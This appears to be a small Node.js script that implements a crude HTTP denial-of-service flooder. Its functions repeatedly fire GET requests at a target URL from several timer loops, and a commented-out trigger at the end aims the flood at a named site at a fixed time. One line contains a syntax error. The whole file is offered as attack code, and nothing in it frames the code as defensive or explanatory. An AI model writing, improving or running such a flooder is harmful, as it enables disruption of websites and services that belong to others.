const request = require("request");
const nt = require("nodetime-js");

let time = nt.time; 
let t = nt.t;

function mk(url) {
  request.get(url)
}

function NDistDos(url, threads=2, interval) {
  Array(threads).fill(1).forEach(thread => {
    ult(url, interval)
  })
}

function ult(url_, interval_) {
  setInterval(()=>{
    mk(url_)
  }, interval_})
} 
  
//if (t("h:m") === "2:22") { NDistDos("https://abc.xyz", 1) };
